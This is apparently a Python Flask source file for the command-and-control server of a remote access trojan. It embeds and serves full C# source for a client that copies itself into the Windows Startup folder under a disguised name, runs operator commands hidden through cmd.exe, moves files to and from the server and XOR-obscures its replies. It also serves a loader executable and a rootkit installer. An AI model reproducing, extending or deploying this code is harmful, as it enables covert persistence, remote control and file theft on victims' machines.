from flask import send_from_directory, Flask, Response

app = Flask(__name__)

from flask import Flask, request, send_from_directory, jsonify, Response
import os
import time

app = Flask(__name__)

UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

clients = {}  # Track clients with their unique identifiers (IP or nickname)
current_cmd = ""
last_result = ""

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_NAME = 'InMemLoader.exe'
clean_name = 'clean.bat'

@app.route("/code")
def serve_code():
    csharp_code = """
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class RATClient
{
    static readonly string C2_SERVER = "http://localhost:7777";
    static string currentDir = Directory.GetCurrentDirectory();
    static string clientIdentifier = GetClientIdentifier();
    static readonly HttpClient client = new HttpClient();

    static void Main()
    {
        InstallToStartup();

        while (true)
        {
            SendClientInfo();
            try
            {
                string cmd = client.GetStringAsync($\"{C2_SERVER}/get\").Result.Trim();
                if (string.IsNullOrEmpty(cmd))
                {
                    Thread.Sleep(1000);
                    continue;
                }

                string output = "";

                if (cmd.StartsWith("cd "))
                {
                    try
                    {
                        Directory.SetCurrentDirectory(cmd.Substring(3).Trim());
                        currentDir = Directory.GetCurrentDirectory();
                    }
                    catch (Exception e)
                    {
                        output = e.Message;
                    }
                }
                else if (cmd.StartsWith("upload "))
                {
                    string path = cmd.Substring(7).Trim();
                    if (File.Exists(path))
                    {
                        try
                        {
                            var content = new MultipartFormDataContent();
                            content.Add(new ByteArrayContent(File.ReadAllBytes(path)), "file", Path.GetFileName(path));
                            client.PostAsync($\"{C2_SERVER}/upload\", content).Wait();
                            output = $"[+] Uploaded {path}";
                        }
                        catch (Exception e)
                        {
                            output = $"[-] Upload error: {e.Message}";
                        }
                    }
                    else
                    {
                        output = "[-] File not found.";
                    }
                }
                else if (cmd.StartsWith("download "))
                {
                    string filename = cmd.Substring(9).Trim();
                    try
                    {
                        byte[] data = client.GetByteArrayAsync($\"{C2_SERVER}/download/{filename}\").Result;
                        File.WriteAllBytes(filename, data);
                        output = $"[+] Downloaded {filename}";
                    }
                    catch (Exception e)
                    {
                        output = $"[-] Download failed: {e.Message}";
                    }
                }
                else if (cmd == "spread")
                {
                    client.PostAsync($\"{C2_SERVER}/spread\", null).Wait();
                    output = "[*] Spreading to other machines in the fake network...";
                }
                else
                {
                    output = RunCommand(cmd);
                }

                string response = $"{currentDir}\\n{output}";
                string encrypted = Xor(response, "nullbeacon");
                client.PostAsync($\"{C2_SERVER}/result\", new StringContent(encrypted)).Wait();
            }
            catch { }

            Thread.Sleep(1000);
        }
    }

    static string Xor(string data, string key)
    {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < data.Length; i++)
        {
            sb.Append((char)(data[i] ^ key[i % key.Length]));
        }
        return sb.ToString();
    }

    static string RunCommand(string cmd)
    {
        try
        {
            var proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + cmd;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();

            string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            return output;
        }
        catch (Exception e)
        {
            return e.Message;
        }
    }

    static void InstallToStartup()
    {
        try
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string startupPath = Path.Combine(appData, @"Microsoft\\Windows\\Start Menu\\Programs\\Startup");
            string target = Path.Combine(startupPath, "winhost.exe");
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
            if (!File.Exists(target))
            {
                File.Copy(currentExe, target);
            }
        }
        catch { }
    }

    static void SendClientInfo()
    {
        try
        {
            client.PostAsync($\"{C2_SERVER}/client_info\", new StringContent(clientIdentifier)).Wait();
        }
        catch { }
    }

    static string GetClientIdentifier()
    {
        return Dns.GetHostName();
    }
}
"""
    return Response(csharp_code, mimetype='text/plain')


@app.route('/install', methods=['GET'])
def download_v2():
    try:
        # Serve the file v2.py
        file_path = os.path.join(CURRENT_DIR, FILE_NAME)

        # Check if the file exists
        if not os.path.exists(file_path):
            return jsonify({'status': 'error', 'message': f'{FILE_NAME} not found on the server.'}), 404

        # Send the file as a response to the client
        return send_from_directory(CURRENT_DIR, FILE_NAME, as_attachment=True)

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500
    
@app.route('/clean', methods=['GET'])
def clean():
    try:
        # Serve the file v2.py
        file_path = os.path.join(CURRENT_DIR, clean_name)

        # Check if the file exists
        if not os.path.exists(file_path):
            return jsonify({'status': 'error', 'message': f'{clean_name} not found on the server.'}), 404

        # Send the file as a response to the client
        return send_from_directory(CURRENT_DIR, clean_name, as_attachment=True)

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500
    
def xor(data, key="nullbeacon"):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

@app.route('/client_info', methods=['POST'])
def update_client_info():
    client_id = request.data.decode()  # Client identifier (IP or nickname)
    clients[client_id] = {"ip": request.remote_addr, "last_seen": time.time()}
    print(f"[*] Client {client_id} updated or connected.")
    return "OK"

@app.route('/get', methods=['GET'])
def get_command():
    return current_cmd

@app.route('/set', methods=['POST'])
def set_command():
    global current_cmd
    current_cmd = request.data.decode()
    return "OK"

@app.route('/result', methods=['POST'])
def post_result():
    global last_result
    encrypted = request.data.decode()
    last_result = xor(encrypted)
    return "OK"

@app.route('/last', methods=['GET'])
def get_last_result():
    return last_result or "[*] No result yet."

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    if file:
        path = os.path.join(UPLOAD_DIR, file.filename)
        file.save(path)
        print(f"[+] File uploaded: {file.filename}")
        return "OK"
    return "No file"

@app.route('/broadcast', methods=['POST'])
def broadcast_command():
    global current_cmd
    cmd = request.data.decode()
    current_cmd = cmd
    print(f"[!] Broadcasting command to all clients: {cmd}")
    return "Broadcast sent"


@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    try:
        return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
    except Exception:
        return "File not found", 404

@app.route('/spread', methods=['POST'])
def spread():
    # This is the spreading functionality (you can simulate it however you like)
    print("[*] Command received to spread RAT to all clients.")
    for client_id, client_data in clients.items():
        # Simulate sending the command to all clients
        print(f"[+] Sending 'spread' command to {client_id} at {client_data['ip']}")
        # Here we would send the command to the clients (via POST or WebSocket)
    return "Spreading started."

@app.route('/clients', methods=['GET'])
def list_clients():
    return {"clients": list(clients.keys())}


PAYLOAD_DIR = r'C:\Users\mxmla\source\repos\InMemLoader\InMemLoader\bin\Debug\net8.0'  # Update this path with the actual folder location
PAYLOAD_FILE = 'InMemLoader.exe'  # Name of the client.exe you want to serve
Shellcode_dir = r'C:\Users\mxmla\Downloads\r77Rootkit 1.7.0'
shellcode_FILE = 'install.exe'

@app.route('/payload', methods=['GET'])
def download_payload():
    try:
        return send_from_directory(PAYLOAD_DIR, PAYLOAD_FILE, as_attachment=True)
    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/shellcode', methods=['GET'])
def download_shellcode():
    # Serve the shellcode file
    try:
        return send_from_directory(Shellcode_dir, shellcode_FILE, as_attachment=True)
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777)